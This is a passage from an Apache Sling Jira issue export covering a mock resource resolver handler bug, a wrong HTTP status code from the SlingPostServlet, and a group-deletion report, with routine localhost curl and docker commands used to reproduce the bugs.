&lt;p&gt;We can&apos;t mock the findResources method for this Service Resource Resolver, as the ResourceResolverFactory &lt;b&gt;always&lt;/b&gt;&#160;internally creates a new MockResourceResolver object (see &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/blob/master/src/main/java/org/apache/sling/testing/resourceresolver/MockResourceResolverFactory.java#L102)&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/blob/master/src/main/java/org/apache/sling/testing/resourceresolver/MockResourceResolverFactory.java#L102)&lt;/a&gt;.&lt;br/&gt;
&#160;&lt;br/&gt;
This means that&#160;&lt;b&gt;all&lt;/b&gt; of the in memory changes like&lt;/p&gt;
&lt;ul&gt;
	&lt;li&gt;findResourcesHandlers&lt;/li&gt;
	&lt;li&gt;queryResourcesHandlers&lt;/li&gt;
	&lt;li&gt;...&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;are lost, so MockFindQueryResources can&apos;t be used, because we can&apos;t get the service resolver from the context (because it is always a new object).&lt;/p&gt;

&lt;p&gt;Same holds true for MockResourceResolverFactory.getAdministrativeResourceResolver(...).&lt;/p&gt;

&lt;p&gt;Is it maybe an idea to add functionality to register the Resource Handlers on the MockResourceResolverFactory, which is able to pass them down to the MockResourceResolver on creation?&lt;/p&gt;</description>
                <environment></environment>
        <key id="13547257">SLING-12001</key>
            <summary>Can&apos;t use MockFindQueryResources when making use of getServiceResourceResolver</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="6" iconUrl="https://issues.apache.org/jira/images/icons/statuses/closed.png" description="The issue is considered finished, the resolution is correct. Issues which are not closed can be reopened.">Closed</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="1">Fixed</resolution>
                                        <assignee username="sseifert">Stefan Seifert</assignee>
                                    <reporter username="robin.brouns@amplexor.com">Robin Brouns</reporter>
                        <labels>
                    </labels>
                <created>Mon, 14 Aug 2023 13:04:21 +0000</created>
                <updated>Mon, 21 Aug 2023 08:52:50 +0000</updated>
                            <resolved>Tue, 15 Aug 2023 12:12:27 +0000</resolved>
                                    <version>Testing ResourceResolver Mock 1.4.2</version>
                                    <fixVersion>Testing ResourceResolver Mock 1.4.4</fixVersion>
                                    <component>Testing</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17754480" author="sseifert@pro-vision.de" created="Tue, 15 Aug 2023 08:18:41 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=robin.brouns%40amplexor.com&quot; class=&quot;user-hover&quot; rel=&quot;robin.brouns@amplexor.com&quot;&gt;robin.brouns@amplexor.com&lt;/a&gt; good idea, i&apos;ve created a proposal following your approach in &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/pull/10&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/pull/10&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17754489" author="robin.brouns@amplexor.com" created="Tue, 15 Aug 2023 08:35:43 +0000"  >&lt;p&gt;Looks good to me &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt;! This will fix indeed the issue. One small remark, to make these handlers maybe part of the&#160;&lt;br/&gt;
MockResourceResolverFactoryOptions so the MockResourceResolver can init based on the options (instead of factory executing some additional init for the MockResourceResolver).&lt;/p&gt;</comment>
                            <comment id="17754499" author="sseifert@pro-vision.de" created="Tue, 15 Aug 2023 08:58:36 +0000"  >&lt;p&gt;well, this would be a completely different but also interesting approach. i&apos;ve created a second PR &lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/pull/11&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/pull/11&lt;/a&gt; which moves the storage of the handlers to the MockResourceResolverFactoryOptions  - which is usually shared by the main resource resolver and all new instances created via the factory.&lt;/p&gt;

&lt;p&gt;maybe that&apos;s even more elegant also it comes with a bit hidden side-effects - but that should not matter in unit test context?&lt;/p&gt;</comment>
                            <comment id="17754534" author="robin.brouns@amplexor.com" created="Tue, 15 Aug 2023 10:04:13 +0000"  >&lt;p&gt;True, for the unit tests, it doesn&apos;t matter that much. If you still want to have the fields available in the MockResourceResolver, you can always change the constructor to:&lt;/p&gt;


&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
&lt;span class=&quot;code-keyword&quot;&gt;public&lt;/span&gt; MockResourceResolver(MockResourceResolverFactoryOptions options, MockResourceResolverFactory factory, Map&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, Map&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt;&amp;gt; resources, Map&amp;lt;&lt;span class=&quot;code-object&quot;&gt;String&lt;/span&gt;, &lt;span class=&quot;code-object&quot;&gt;Object&lt;/span&gt;&amp;gt; attributes) {
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.temporaryResources = &lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; LinkedHashMap();
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.deletedResources = &lt;span class=&quot;code-keyword&quot;&gt;new&lt;/span&gt; HashSet();
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.findResourcesHandlers = options.getFindResourcesHandlers(); &#160; 
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.queryResourcesHandlers = options.getQueryResourcesHandlers();
 &#160; &#160;&lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.factory = factory;
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.options = options;
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.resources = resources;
    &lt;span class=&quot;code-keyword&quot;&gt;this&lt;/span&gt;.attributes = attributes;
} &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;but for now I think it is fine if they reside within the MockResourceResolverFactoryOptions&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</comment>
                            <comment id="17754602" author="sseifert@pro-vision.de" created="Tue, 15 Aug 2023 12:12:27 +0000"  >&lt;p&gt;ok, we&apos;re going with PR #11 keeping the handlers centrally in MockResourceResolverFactoryOptions &lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/commit/ed4e8fcac08401408ec8ce7f1e4d08a60e8a83a6&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://github.com/apache/sling-org-apache-sling-testing-resourceresolver-mock/commit/ed4e8fcac08401408ec8ce7f1e4d08a60e8a83a6&lt;/a&gt;&lt;/p&gt;</comment>
                            <comment id="17754634" author="robin.brouns@amplexor.com" created="Tue, 15 Aug 2023 12:47:54 +0000"  >&lt;p&gt;Cool thanks &lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=sseifert&quot; class=&quot;user-hover&quot; rel=&quot;sseifert&quot;&gt;sseifert&lt;/a&gt;!&lt;/p&gt;</comment>
                    </comments>
                <issuelinks>
                            <issuelinktype id="12310660">
                    <name>Completes</name>
                                            <outwardlinks description="fixes">
                                        <issuelink>
            <issuekey id="13352030">SLING-10062</issuekey>
        </issuelink>
                            </outwardlinks>
                                                        </issuelinktype>
                    </issuelinks>
                <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 10 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jru0:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11998] SlingPostServlet responds with wrong status code upon Oak Access error</title>
                <link>https://issues.apache.org/jira/browse/SLING-11998</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;In Sling 12, the SlingPostServlet sends back a HTTP status 422 Invalid Payload if the underlying OAK persistence layer reports an access error to a resource.&lt;/p&gt;

&lt;p&gt;The correct response code is HTTP 403 Forbidden:&lt;/p&gt;

&lt;p&gt;&lt;cite&gt;The request contained valid data and was understood by the server, but the server is refusing action. This may be due to the user not having the necessary permissions for a resource...&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;This is exactly opposite to 422, which indicates that the payload is erroneous. This misleads subsequent debugging efforts. Additionally, this error is not logged with launcher/error.log.&lt;/p&gt;</description>
                <environment>Sling 12</environment>
        <key id="13546641">SLING-11998</key>
            <summary>SlingPostServlet responds with wrong status code upon Oak Access error</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="3" iconUrl="https://issues.apache.org/jira/images/icons/priorities/major.svg">Major</priority>
                        <status id="1" iconUrl="https://issues.apache.org/jira/images/icons/statuses/open.png" description="The issue is open and ready for the assignee to start work on it.">Open</status>
                    <statusCategory id="2" key="new" colorName="blue-gray"/>
                                    <resolution id="-1">Unresolved</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="yumeier">Juerg Meier</reporter>
                        <labels>
                    </labels>
                <created>Wed, 9 Aug 2023 07:44:58 +0000</created>
                <updated>Wed, 29 Jan 2025 06:40:52 +0000</updated>
                                                                            <component>Servlets</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>2</watches>
                                                                                                                <comments>
                            <comment id="17752788" author="rombert" created="Thu, 10 Aug 2023 12:26:49 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=yumeier&quot; class=&quot;user-hover&quot; rel=&quot;yumeier&quot;&gt;yumeier&lt;/a&gt; - does this happen with the latest (13-SNAPSHOT) version of the Sling Starter?&lt;/p&gt;</comment>
                            <comment id="17754507" author="yumeier" created="Tue, 15 Aug 2023 09:07:14 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=rombert&quot; class=&quot;user-hover&quot; rel=&quot;rombert&quot;&gt;rombert&lt;/a&gt; The version used is the offical Sling12 &quot;LTS&quot; download from &lt;a href=&quot;https://sling.apache.org/downloads.cgi,&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;https://sling.apache.org/downloads.cgi,&lt;/a&gt; docker image (oak tar). According to MANIFEST.MF of the org.apache.sling.feature.launcher.jar, this is Implementation-Version: 1.1.26 .&lt;/p&gt;</comment>
                            <comment id="17764583" author="rombert" created="Wed, 13 Sep 2023 10:28:37 +0000"  >&lt;p&gt;&lt;a href=&quot;https://issues.apache.org/jira/secure/ViewProfile.jspa?name=yumeier&quot; class=&quot;user-hover&quot; rel=&quot;yumeier&quot;&gt;yumeier&lt;/a&gt; - what kind of access are you trying to perform? I just tried this with the latest SNAPSHOT version and got a 404&lt;/p&gt;

&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;$ curl --head http://localhost:8080/apps.json
HTTP/1.1 404 Not Found
Content-Type: text/html;charset=utf-8
Transfer-Encoding: chunked
&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;BTW, you can easily try our latest snapshot version to verify a bug with &lt;/p&gt;
&lt;div class=&quot;preformatted panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;preformattedContent panelContent&quot;&gt;
&lt;pre&gt;$ docker run --rm -p 8080:8080 apache/sling:snapshot&lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12310250" key="com.atlassian.jira.plugin.system.customfieldtypes:multicheckboxes">
                        <customfieldname>Flags</customfieldname>
                        <customfieldvalues>
                                <customfieldvalue key="10431"><![CDATA[Important]]></customfieldvalue>
    
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 6 weeks ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1joe8:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11997] Sling post servlet delete protected node like group report success but actual failed</title>
                <link>https://issues.apache.org/jira/browse/SLING-11997</link>
                <project id="12310710" key="SLING">Sling</project>
                    <description>&lt;p&gt;Sling post servlet delete protected node report success but actual failed&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;curl -u user:pwd -F&quot;:operation=delete&quot; &lt;a href=&quot;http://localhost:4502/home/groups/C/CrKDhM1fP5xxs5YcN6rL&quot; class=&quot;external-link&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener&quot;&gt;http://localhost:8080/home/groups/C/CrKDhM1fP5xxs5YcN6rL&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;it report success response below:&lt;/p&gt;
&lt;div class=&quot;code panel&quot; style=&quot;border-width: 1px;&quot;&gt;&lt;div class=&quot;codeContent panelContent&quot;&gt;
&lt;pre class=&quot;code-java&quot;&gt;
curl -u admin:admin -F&lt;span class=&quot;code-quote&quot;&gt;&quot;deleteAuthorizable=&lt;span class=&quot;code-keyword&quot;&gt;true&lt;/span&gt;&quot;&lt;/span&gt; http:&lt;span class=&quot;code-comment&quot;&gt;//localhost:8080/home/groups/C/CrKDhM1fP5xxs5YcN6rL
&lt;/span&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
&#160; &#160; &amp;lt;title&amp;gt;Content modified /home/groups/C/CrKDhM1fP5xxs5YcN6rL&amp;lt;/title&amp;gt;
&amp;lt;/head&amp;gt;
&#160; &#160; &amp;lt;body&amp;gt;
&#160; &#160; &amp;lt;h1&amp;gt;Content modified /home/groups/C/CrKDhM1fP5xxs5YcN6rL&amp;lt;/h1&amp;gt;
&#160; &#160; &amp;lt;table&amp;gt;
&#160; &#160; &#160; &#160; &amp;lt;tbody&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;Status&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;div id=&lt;span class=&quot;code-quote&quot;&gt;&quot;Status&quot;&lt;/span&gt;&amp;gt;200&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;Message&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;div id=&lt;span class=&quot;code-quote&quot;&gt;&quot;Message&quot;&lt;/span&gt;&amp;gt;OK&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;Location&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;img class=&lt;span class=&quot;code-quote&quot;&gt;&quot;cq-LinkChecker cq-LinkChecker--prefix cq-LinkChecker--invalid&quot;&lt;/span&gt; src=&lt;span class=&quot;code-quote&quot;&gt;&quot;/libs/cq/linkchecker/resources/linkcheck_o.gif&quot;&lt;/span&gt; alt=&lt;span class=&quot;code-quote&quot;&gt;&quot;invalid link: /home/groups/C/CrKDhM1fP5xxs5YcN6rL&quot;&lt;/span&gt; title=&lt;span class=&quot;code-quote&quot;&gt;&quot;invalid link: /home/groups/C/CrKDhM1fP5xxs5YcN6rL&quot;&lt;/span&gt; border=&lt;span class=&quot;code-quote&quot;&gt;&quot;0&quot;&lt;/span&gt;&amp;gt;/home/groups/C/CrKDhM1fP5xxs5YcN6rL&amp;lt;img class=&lt;span class=&quot;code-quote&quot;&gt;&quot;cq-LinkChecker cq-LinkChecker--suffix cq-LinkChecker--invalid&quot;&lt;/span&gt; src=&lt;span class=&quot;code-quote&quot;&gt;&quot;/libs/cq/linkchecker/resources/linkcheck_c.gif&quot;&lt;/span&gt; border=&lt;span class=&quot;code-quote&quot;&gt;&quot;0&quot;&lt;/span&gt;&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;Parent Location&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;a href=&lt;span class=&quot;code-quote&quot;&gt;&quot;/home/groups/C&quot;&lt;/span&gt; id=&lt;span class=&quot;code-quote&quot;&gt;&quot;ParentLocation&quot;&lt;/span&gt;&amp;gt;/home/groups/C&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;Path&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;div id=&lt;span class=&quot;code-quote&quot;&gt;&quot;Path&quot;&lt;/span&gt;&amp;gt;/home/groups/C/CrKDhM1fP5xxs5YcN6rL&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;Referer&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;a href=&lt;span class=&quot;code-quote&quot;&gt;&quot;&quot; id=&quot;&lt;/span&gt;Referer&quot;&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;tr&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;ChangeLog&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;td&amp;gt;&amp;lt;div id=&lt;span class=&quot;code-quote&quot;&gt;&quot;ChangeLog&quot;&lt;/span&gt;&amp;gt;&amp;amp;lt;pre&amp;amp;gt;&amp;amp;lt;/pre&amp;amp;gt;&amp;lt;/div&amp;gt;&amp;lt;/td&amp;gt;
&#160; &#160; &#160; &#160; &#160; &#160; &amp;lt;/tr&amp;gt;
&#160; &#160; &#160; &#160; &amp;lt;/tbody&amp;gt;
&#160; &#160; &amp;lt;/table&amp;gt;
&#160; &#160; &amp;lt;p&amp;gt;&amp;lt;a href=&quot;&quot;&amp;gt;Go Back&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&#160; &#160; &amp;lt;p&amp;gt;&amp;lt;img class=&lt;span class=&quot;code-quote&quot;&gt;&quot;cq-LinkChecker cq-LinkChecker--prefix cq-LinkChecker--invalid&quot;&lt;/span&gt; src=&lt;span class=&quot;code-quote&quot;&gt;&quot;/libs/cq/linkchecker/resources/linkcheck_o.gif&quot;&lt;/span&gt; alt=&lt;span class=&quot;code-quote&quot;&gt;&quot;invalid link: /home/groups/C/CrKDhM1fP5xxs5YcN6rL&quot;&lt;/span&gt; title=&lt;span class=&quot;code-quote&quot;&gt;&quot;invalid link: /home/groups/C/CrKDhM1fP5xxs5YcN6rL&quot;&lt;/span&gt; border=&lt;span class=&quot;code-quote&quot;&gt;&quot;0&quot;&lt;/span&gt;&amp;gt;Modified Resource&amp;lt;img class=&lt;span class=&quot;code-quote&quot;&gt;&quot;cq-LinkChecker cq-LinkChecker--suffix cq-LinkChecker--invalid&quot;&lt;/span&gt; src=&lt;span class=&quot;code-quote&quot;&gt;&quot;/libs/cq/linkchecker/resources/linkcheck_c.gif&quot;&lt;/span&gt; border=&lt;span class=&quot;code-quote&quot;&gt;&quot;0&quot;&lt;/span&gt;&amp;gt;&amp;lt;/p&amp;gt;
&#160; &#160; &amp;lt;p&amp;gt;&amp;lt;a href=&lt;span class=&quot;code-quote&quot;&gt;&quot;/home/groups/C&quot;&lt;/span&gt;&amp;gt;Parent of Modified Resource&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
&#160; &#160; &amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt; &lt;/pre&gt;
&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&#160;but actually failed&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;

&lt;p&gt;&#160;&lt;/p&gt;</description>
                <environment></environment>
        <key id="13546595">SLING-11997</key>
            <summary>Sling post servlet delete protected node like group report success but actual failed</summary>
                <type id="1" iconUrl="https://issues.apache.org/jira/secure/viewavatar?size=xsmall&amp;avatarId=21133&amp;avatarType=issuetype">Bug</type>
                                            <priority id="4" iconUrl="https://issues.apache.org/jira/images/icons/priorities/minor.svg">Minor</priority>
                        <status id="5" iconUrl="https://issues.apache.org/jira/images/icons/statuses/resolved.png" description="A resolution has been taken, and it is awaiting verification by reporter. From here issues are either reopened, or are closed.">Resolved</status>
                    <statusCategory id="3" key="done" colorName="green"/>
                                    <resolution id="8">Not A Problem</resolution>
                                        <assignee username="-1">Unassigned</assignee>
                                    <reporter username="francoiszhang">Jun Zhang</reporter>
                        <labels>
                    </labels>
                <created>Tue, 8 Aug 2023 22:48:15 +0000</created>
                <updated>Tue, 8 Aug 2023 22:56:32 +0000</updated>
                            <resolved>Tue, 8 Aug 2023 22:56:32 +0000</resolved>
                                                                    <component>Sling Security</component>
                        <due></due>
                            <votes>0</votes>
                                    <watches>1</watches>
                                                                                                                <comments>
                            <comment id="17752196" author="francoiszhang" created="Tue, 8 Aug 2023 22:49:35 +0000"  >&lt;p&gt;FYI, proper parameter like -FdeleteAuthorizable=true works to delete that successfully&lt;/p&gt;</comment>
                            <comment id="17752199" author="francoiszhang" created="Tue, 8 Aug 2023 22:56:32 +0000"  >&lt;p&gt;endu p an AEM issue instead of sling issue, sorry&lt;/p&gt;</comment>
                    </comments>
                    <attachments>
                    </attachments>
                <subtasks>
                    </subtasks>
                <customfields>
                                                                            <customfield id="customfield_12310310" key="com.atlassian.jira.toolkit:attachments">
                        <customfieldname>Attachment count</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0.0</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        <customfield id="customfield_12314020" key="com.atlassian.jira.plugins.jira-development-integration-plugin:devsummary">
                        <customfieldname>Development</customfieldname>
                        <customfieldvalues>
                            
                        </customfieldvalues>
                    </customfield>
                                                                                                                        <customfield id="customfield_12313422" key="com.atlassian.jirafisheyeplugin:jobcheckbox">
                        <customfieldname>Enable Automatic Patch Review</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue><![CDATA[false]]></customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    <customfield id="customfield_12310420" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Global Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                        <customfield id="customfield_12312521" key="com.atlassian.jira.toolkit:LastCommentDate">
                        <customfieldname>Last public comment date</customfieldname>
                        <customfieldvalues>
                            2 years, 11 weeks, 1 day ago
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                <customfield id="customfield_12311820" key="com.pyxis.greenhopper.jira:gh-lexo-rank">
                        <customfieldname>Rank</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>0|z1jo40:</customfieldvalue>

                        </customfieldvalues>
                    </customfield>
                                                                <customfield id="customfield_12310920" key="com.pyxis.greenhopper.jira:gh-global-rank">
                        <customfieldname>Rank (Obsolete)</customfieldname>
                        <customfieldvalues>
                            <customfieldvalue>9223372036854775807</customfieldvalue>
                        </customfieldvalues>
                    </customfield>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            </customfields>
    </item>


<item>
            <title>[SLING-11992] Maven 3.9.2+ reports plugin validation issue on htl-maven-plugin</title>
